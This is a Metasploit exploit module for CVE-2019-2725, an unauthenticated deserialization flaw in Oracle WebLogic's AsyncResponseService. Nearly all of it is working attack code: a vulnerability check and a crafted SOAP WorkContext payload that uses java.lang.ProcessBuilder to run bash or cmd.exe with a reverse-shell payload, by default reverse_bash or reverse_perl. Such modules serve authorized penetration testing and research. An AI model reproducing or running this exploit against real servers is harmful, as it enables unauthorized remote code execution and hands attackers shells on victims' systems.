# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Powershell

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039; => &#039;Oracle Weblogic Server Deserialization RCE - AsyncResponseService &#039;,
      &#039;Description&#039; => %q{
        An unauthenticated attacker with network access to the Oracle Weblogic Server T3
        interface can send a malicious SOAP request to the interface WLS AsyncResponseService
        to execute code on the vulnerable host.
      },
      &#039;Author&#039; =>
        [
        &#039;Andres Rodriguez - 2Secure (@acamro) <acamro[at]gmail.com>&#039;,  # Metasploit Module
        ],
      &#039;License&#039; => MSF_LICENSE,
      &#039;References&#039; =>
        [
          [&#039;CVE&#039;, &#039;2019-2725&#039;],
          [&#039;CNVD-C&#039;, &#039;2019-48814&#039;],
          [&#039;URL&#039;, &#039;http://www.cnvd.org.cn/webinfo/show/4999&#039;],
          [&#039;URL&#039;, &#039;https://www.oracle.com/technetwork/security-advisory/alert-cve-2019-2725-5466295.html&#039;]
        ],
      &#039;Privileged&#039; => false,
      &#039;Platform&#039; => %w{ unix win solaris },
      &#039;Targets&#039; =>
        [
          [ &#039;Unix&#039;,
            &#039;Platform&#039; => &#039;unix&#039;,
            &#039;Arch&#039; => ARCH_CMD,
            &#039;DefaultOptions&#039; => {&#039;PAYLOAD&#039; => &#039;cmd/unix/reverse_bash&#039;}
          ],
          [ &#039;Windows&#039;,
            &#039;Platform&#039; => &#039;win&#039;,
            &#039;Arch&#039; => [ARCH_X64, ARCH_X86],
          ],
          [ &#039;Solaris&#039;,
            &#039;Platform&#039; => &#039;solaris&#039;,
            &#039;Arch&#039; => ARCH_CMD,
            &#039;DefaultOptions&#039; => {&#039;PAYLOAD&#039; => &#039;cmd/unix/reverse_perl&#039;},
            &#039;Payload&#039; => {
              &#039;Space&#039;       => 2048,
              &#039;DisableNops&#039; => true,
              &#039;Compat&#039;      =>
                {
                  &#039;PayloadType&#039; => &#039;cmd&#039;,
                  &#039;RequiredCmd&#039; => &#039;generic perl telnet&#039;,
                }
            }
          ]
        ],
      &#039;DefaultTarget&#039; => 0,
      &#039;DefaultOptions&#039; =>
        {
          &#039;WfsDelay&#039; => 12
        },
      &#039;DisclosureDate&#039; => &#039;Apr 23 2019&#039;))

    register_options(
      [
        Opt::RPORT(7001),
        OptString.new(&#039;URIPATH&#039;, [false, &#039;URL to the weblogic instance (leave blank to substitute RHOSTS)&#039;, nil]),
        OptString.new(&#039;WSPATH&#039;, [true, &#039;URL to AsyncResponseService&#039;, &#039;/_async/AsyncResponseService&#039;])
      ]
    )
  end

  def check
    res = send_request_cgi(
      &#039;uri&#039;      => normalize_uri(datastore[&#039;WSPATH&#039;]),
      &#039;method&#039;   => &#039;POST&#039;,
      &#039;ctype&#039;    => &#039;text/xml&#039;,
      &#039;headers&#039;  => {&#039;SOAPAction&#039; => &#039;&#039; }
    )

    if res && res.code == 500 && res.body.include?("<faultcode>env:Client</faultcode>")
      vprint_status("The target returned a vulnerable HTTP code: /#{res.code}")
      vprint_status("The target returned a vulnerable HTTP error: /#{res.body.split("\n")[0]}")
      Exploit::CheckCode::Vulnerable
    elsif res && res.code != 202
      vprint_status("The target returned a non-vulnerable HTTP code")
      Exploit::CheckCode::Safe
    elsif res.nil?
      vprint_status("The target did not respond in an expected way")
      Exploit::CheckCode::Unknown
    else
      vprint_status("The target returned HTTP code: #{res.code}")
      vprint_status("The target returned HTTP body: #{res.body.split("\n")[0]} [...]")
      Exploit::CheckCode::Unknown
    end
  end

  def exploit
    print_status("Generating payload...")
    case target.name
    when &#039;Windows&#039;
      string0_cmd = &#039;cmd.exe&#039;
      string1_param = &#039;/c&#039;
      shell_payload = cmd_psh_payload(payload.encoded, payload_instance.arch.first, {remove_comspec: true, encoded: false })
    when &#039;Unix&#039;,&#039;Solaris&#039;
      string0_cmd = &#039;/bin/bash&#039;
      string1_param = &#039;-c&#039;
      shell_payload = payload.encoded
    end

    random_action = rand_text_alphanumeric(20)
    random_relates = rand_text_alphanumeric(20)

    soap_payload =  %Q|<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"|
    soap_payload <<   %Q|xmlns:wsa="http://www.w3.org/2005/08/addressing"|
    soap_payload <<   %Q|xmlns:asy="http://www.bea.com/async/AsyncResponseService">|
    soap_payload <<   %Q|<soapenv:Header>|
    soap_payload <<     %Q|<wsa:Action>#{random_action}</wsa:Action>|
    soap_payload <<     %Q|<wsa:RelatesTo>#{random_relates}</wsa:RelatesTo>|
    soap_payload <<     %Q|<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">|
    soap_payload <<       %Q|<void class="java.lang.ProcessBuilder">|
    soap_payload <<         %Q|<array class="java.lang.String" length="3">|
    soap_payload <<           %Q|<void index="0">|
    soap_payload <<             %Q|<string>#{string0_cmd}</string>|
    soap_payload <<           %Q|</void>|
    soap_payload <<           %Q|<void index="1">|
    soap_payload <<             %Q|<string>#{string1_param}</string>|
    soap_payload <<           %Q|</void>|
    soap_payload <<           %Q|<void index="2">|
    soap_payload <<             %Q|<string>#{shell_payload.encode(xml: :text)}</string>|
   #soap_payload <<             %Q|<string>#{xml_encode(shell_payload)}</string>|
    soap_payload <<           %Q|</void>|
    soap_payload <<         %Q|</array>|
    soap_payload <<       %Q|<void method="start"/>|
    soap_payload <<       %Q|</void>|
    soap_payload <<     %Q|</work:WorkContext>|
    soap_payload <<   %Q|</soapenv:Header>|
    soap_payload <<   %Q|<soapenv:Body>|
    soap_payload <<     %Q|<asy:onAsyncDelivery/>|
    soap_payload <<   %Q|</soapenv:Body>|
    soap_payload << %Q|</soapenv:Envelope>|

    uri = normalize_uri(datastore[&#039;WSPATH&#039;])
    if uri.nil?
      datastore[&#039;URIPATH&#039;] = "http://#{RHOST}:#{RPORT}/"
    end

    print_status("Sending payload...")

    begin
      res = send_request_cgi(
        &#039;uri&#039;      => uri,
        &#039;method&#039;   => &#039;POST&#039;,
        &#039;ctype&#039;    => &#039;text/xml&#039;,
        &#039;data&#039;     => soap_payload,
        &#039;headers&#039;  => {&#039;SOAPAction&#039; => &#039;&#039; }
      )
    rescue Errno::ENOTCONN
      fail_with(Failure::Disconnected, "The target forcibly closed the connection, and is likely not vulnerable.")
    end

    if res.nil?
      fail_with(Failure::Unreachable, "No response from host")
    elsif res && res.code != 202
      fail_with(Failure::UnexpectedReply,"Exploit failed.  Host did not responded with HTTP code #{res.code} instead of HTTP code 202")
    end
  end
end

